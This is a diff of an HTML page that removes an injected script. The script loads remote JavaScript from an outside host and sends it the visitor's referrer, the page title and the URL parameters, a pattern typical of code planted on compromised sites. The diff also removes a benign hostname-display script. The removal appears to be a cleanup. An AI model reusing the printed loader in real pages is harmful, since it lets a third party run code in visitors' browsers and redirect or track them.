@@ -33,16 +33,6 @@
 
 	<![endif]-->
 
-<span id="41ab87b7-0089-722b-577f-b280ca36a93f"></span><script type="application/javascript">
-var d=document;var s=d.createElement('script'); 
-s.src='https://sk.part59.ru/vV7J2F?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm6082c9a27748c=script6082c9a27748d&_cid=41ab87b7-0089-722b-577f-b280ca36a93f'; 
-if (document.currentScript) { 
-document.currentScript.parentNode.insertBefore(s, document.currentScript);
-} else {
-d.getElementsByTagName('head')[0].appendChild(s);
-}
-if (document.location.protocol === 'https:' && 'https://sk.part59.ru/vV7J2F?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm6082c9a27748c=script6082c9a27748d'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
-</script>
 
 
 </head>
@@ -222,11 +212,6 @@ Hellerside, NC 07956</p>
 			})
 		}
 	</script>
-	<script>
-		let elems = document.querySelectorAll('.server-name');
-		elems.forEach((elem) => {
-			elem.innerHTML = window.location.hostname
-		})
-	</script>
+	
 	</body>
 </html>
